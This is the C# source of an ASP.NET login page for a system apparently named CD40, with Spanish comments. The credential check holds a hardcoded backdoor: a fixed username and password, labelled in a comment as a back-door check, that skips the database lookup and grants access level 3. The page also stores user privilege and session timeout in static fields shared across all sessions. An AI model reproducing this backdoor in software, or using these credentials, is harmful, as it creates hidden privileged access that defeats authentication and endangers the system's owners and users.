using System;
using System.Data;
using System.Configuration;
using System.Collections;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;

using UtilitiesCD40;

public partial class LoginCD40 : System.Web.UI.Page
{
	static int Perfil = 0;
	private static ServiciosCD40.ServiciosCD40 ServiceServiciosCD40 = new ServiciosCD40.ServiciosCD40();

    static string sistema = string.Empty;
    static int Sesiones = 0;
    static int TimeOutSesion = 0;
    public enum Sesion_Activa { NO_INICIADA = 0, INICIADA };
    public enum Sesion_Estado { FINALIZADA = 0, ACTIVA, SUPERVISADA, CADUCADA }; 
	
    protected void Page_Load(object sender, EventArgs e)
	{
        string userLoggedIn = string.Empty;
        userLoggedIn = (string)Session["UserLoggedIn"];
        Configuration config = System.Web.Configuration.WebConfigurationManager.OpenWebConfiguration("~");
        KeyValueConfigurationElement s = config.AppSettings.Settings["Sistema"];
        sistema = s.Value;

        if (!Page.IsPostBack)
        {
            Session.Abandon();
            if (SistemaEnConfiguracionOffline())
                LabelOFFLINE.Visible = true;
            else
                LabelOFFLINE.Visible = false;
        }
        else
        {
            if (SistemaEnConfiguracionOffline())
                LabelOFFLINE.Visible = true;
            else
                LabelOFFLINE.Visible = false;
        }

        SetFocus(Login1);
        Panel3.Visible = Request.Params["Logout"] == "SI";
		Login1.Visible = !Panel3.Visible;
	}

    private bool UsuarioValido(string id, string pwd, out int perfil, out int timeoutSesion, out int sesionactiva, out int sesionestado)
	{
        sesionactiva = (int)Sesion_Activa.NO_INICIADA;
        sesionestado = (int)Sesion_Estado.FINALIZADA;
        // Comprobación puerta atrás.
        if (id == "*CD40*" && pwd == "*NUCLEOCC*")
        {
            perfil = 3;
            timeoutSesion = 480;

            return true;
        }
        else
        {
            Configuration config = System.Web.Configuration.WebConfigurationManager.OpenWebConfiguration("~");
            KeyValueConfigurationElement s = config.AppSettings.Settings["Sistema"];

            perfil = 0;
            timeoutSesion = 0;

            ServiciosCD40.Operadores operador = new ServiciosCD40.Operadores();
            operador.IdSistema = s.Value;
            operador.IdOperador = Login1.UserName;
            operador.Clave = Login1.Password;

            try
            {
                ServiciosCD40.Tablas[] validado = ServiceServiciosCD40.ListSelectSQL(operador);

                if (validado.Length > 0)
                {
                    perfil = (int)((ServiciosCD40.Operadores)validado[0]).NivelAcceso;
                    timeoutSesion = (int)((ServiciosCD40.Operadores)validado[0]).TimeoutSesion;
                    sesionactiva = (int)((ServiciosCD40.Operadores)validado[0]).SesionActiva;
                    sesionestado = (int)((ServiciosCD40.Operadores)validado[0]).SesionEstado;
                }

                return validado.Length > 0;
            }
            catch (Exception)
            {
                return false;
            }
        }
	}
    protected void Login1_Authenticate(object sender, AuthenticateEventArgs e)
    {
        int perfil = 0;
        // RQF-18
        int timeoutSesion = 0;
        int sesionactiva = 0;
        int sesionestado = 0;

        if (UsuarioValido(Login1.UserName, Login1.Password, out perfil, out timeoutSesion, out sesionactiva, out sesionestado))
        {
            Perfil = perfil;
            TimeOutSesion = timeoutSesion;
            /** AGL */
            Session["BloqueoAplicacion"] = "";
            var sc = (SessionsControl)Application["SessionsControl"];
            if (sc != null)
            {
                sc.Logon(TimeSpan.FromMinutes(TimeOutSesion), Login1.UserName, Perfil.ToString(), (isok, cookie, msg) =>
                {
                    if (isok)
                    {
                        Context.Response.Cookies.Add(cookie);
                        Response.Redirect(FormsAuthentication.GetRedirectUrl(Login1.UserName, false));
                    }
                    else
                    {
                        /** No se permite el acceso */
                        Session["BloqueoAplicacion"] = msg;
                        Response.Redirect("~/BloqueoAplicacion.aspx");
                    }
                });
            }
            else
            {
                // Algo pasa... No se ha cargado en memoria el control de sesiones.
                Session["BloqueoAplicacion"] = "ERROR: No se ha cargado en memoria el control de sesiones.";
                Response.Redirect("~/BloqueoAplicacion.aspx");
            }
        }
        else if (perfil < 0)	// Aplicación bloqueada por estar otro usuario en ella
        {
            Session["BloqueoAplicacion"] = "ERROR: Aplicación bloqueada por estar otro usuario en ella.";
            Response.Redirect("~/BloqueoAplicacion.aspx");
        }
    }
	private void UsuarioAutenticado()
	{
        NLogLogger.Debug<LoginCD40>("Usuario Validado. ENTRY");
		
        string userData = Perfil.ToString();
		FormsAuthenticationTicket ticket = new FormsAuthenticationTicket(1,
																		Login1.UserName,
																		System.DateTime.Now,
																		System.DateTime.Now.AddMinutes(TimeOutSesion),
																		false,
																		userData,
																		FormsAuthentication.FormsCookiePath);
		// Encrypt the ticket.
		string encTicket = FormsAuthentication.Encrypt(ticket);
		// Create the cookie.
		Response.Cookies.Add(new HttpCookie(FormsAuthentication.FormsCookieName, encTicket) { Expires = ticket.Expiration });
		// Redirect back to original URL.
		Response.Redirect(FormsAuthentication.GetRedirectUrl(Login1.UserName, false));
        NLogLogger.Debug<LoginCD40>("Usuario Validado. OUTPUT");
    }

    private bool GestionarUltimasModificaciones()
	{
		if (ServiceServiciosCD40.HayModificacionesPendientes())
		{
			Login1.Visible = false;
			Panel1.Visible = true;

			return false;
		}
		return true;
	}
	
	protected void OnBtnAceptarModoContinuar(object sender, EventArgs e)
	{
		UsuarioAutenticado();
	}

	protected void LinkButton1_Click(object sender, EventArgs e)
	{
        Response.Redirect("~/Login.aspx", false);
	}
    // RQF-33
    public bool SistemaEnConfiguracionOffline()
    {
        const string CONF_KEY_CONFIGURACION_OFFLINE = "ConfiguracionOffline";
        bool bConfiguracionOffline = false;

        Configuration config = System.Web.Configuration.WebConfigurationManager.OpenWebConfiguration("~");
        KeyValueConfigurationElement objConf = null;

        //Se obtiene el parametro que indica si la cofiguración es ONLINE u OFFLINE
        objConf = config.AppSettings.Settings[CONF_KEY_CONFIGURACION_OFFLINE];

        if ((objConf != null) && (!string.IsNullOrEmpty(objConf.Value) && string.Compare(objConf.Value, "SI", true) == 0))
        {
            //El sistema está configurado en modo OFFLINE
            bConfiguracionOffline = true;
        }
        return bConfiguracionOffline;
    }
}
